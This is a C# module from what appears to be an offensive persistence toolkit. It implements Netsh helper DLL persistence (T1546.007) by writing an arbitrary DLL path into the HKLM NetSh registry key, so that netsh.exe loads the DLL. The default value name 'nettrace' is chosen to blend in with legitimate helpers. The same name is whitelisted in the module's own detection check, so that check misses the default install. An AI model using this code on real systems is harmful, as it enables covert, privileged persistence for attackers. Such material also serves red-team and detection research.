using System;
using System.Collections.Generic;
using Tendril.Core;
using Tendril.Utilities;

namespace Tendril.Modules
{
    /// <summary>
    /// Netsh Helper DLL Persistence (T1546.007)
    ///
    /// Netsh.exe loads helper DLLs registered under:
    ///   HKLM\SOFTWARE\Microsoft\NetSh
    /// Each value is a DLL path loaded by netsh on startup. If netsh is called
    /// via a scheduled task, service, or script, the helper DLL executes too.
    ///
    /// Requires admin. The DLL must export InitHelperDll (or netsh crashes).
    /// </summary>
    public class NetshHelperDll : ITendril
    {
        public string Name { get { return "NetshHelperDll"; } }
        public string Description { get { return "Netsh helper DLL - loads when netsh.exe runs"; } }
        public string MitreId { get { return "T1546.007"; } }
        public bool RequiresAdmin { get { return true; } }
        public bool IsReconOnly { get { return false; } }

        private const string RegPath = @"SOFTWARE\Microsoft\NetSh";

        public TendrilResult Install(Dictionary<string, string> options)
        {
            string payload, name;
            if (!options.TryGetValue("payload", out payload))
                return new TendrilResult(ResultStatus.Failed, Name, "Missing required option: /payload:<dll_path>");
            if (!options.TryGetValue("name", out name))
                name = "nettrace"; // blend in with existing helpers

            bool ok = RegistryUtils.SetRegValue("HKLM", RegPath, name, payload);
            if (!ok)
                return new TendrilResult(ResultStatus.Failed, Name, "Failed to write NetSh registry key (admin?)");

            return new TendrilResult(ResultStatus.Success, Name,
                string.Format("Netsh helper registered: {0} -> {1}", name, payload))
                .WithMeta("ValueName", name)
                .WithMeta("DLL", payload)
                .WithMeta("Key", @"HKLM\" + RegPath);
        }

        public TendrilResult Remove(Dictionary<string, string> options)
        {
            string name;
            if (!options.TryGetValue("name", out name))
                name = "nettrace";

            RegistryUtils.DeleteRegValue("HKLM", RegPath, name);
            return new TendrilResult(ResultStatus.Success, Name,
                string.Format("Netsh helper removed: {0}", name));
        }

        public List<TendrilResult> Check()
        {
            var results = new List<TendrilResult>();

            var values = RegistryUtils.GetRegValues("HKLM", RegPath);
            if (values == null) return results;

            // Known legitimate helpers (baseline)
            var known = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
            {
                "dhcpclient", "dot3cfg", "fwcfg", "hnetmon", "ifmon",
                "napmontr", "netiohlp", "nteventlog", "peerdistsh",
                "ras", "rpcnsh", "nshhttp", "nshipsec", "nshwlan",
                "p2pnetsh", "wcnnetsh", "wlancfg",
                // Numeric keys (index-based entries)
                "1", "2", "3", "4", "5", "6", "7", "8", "9", "10",
                // Common legitimate helpers not in system32 check
                "authfwcfg", "dnsclient", "netprofm", "nettrace",
                "nshwfp", "rpc", "wwancfg", "whhelper", "wshelper",
                "rasmontr"
            };

            foreach (var kv in values)
            {
                string val = kv.Value != null ? kv.Value.ToString() : "";
                bool isKnown = known.Contains(kv.Key.ToLower()) ||
                               val.ToLower().Contains(@"\windows\system32\");

                if (!isKnown)
                {
                    results.Add(new TendrilResult(ResultStatus.Warning, Name,
                        string.Format("Non-standard Netsh helper: {0} -> {1}", kv.Key, val))
                        .WithMeta("ValueName", kv.Key)
                        .WithMeta("DLL", val));
                }
            }
            return results;
        }
    }
}
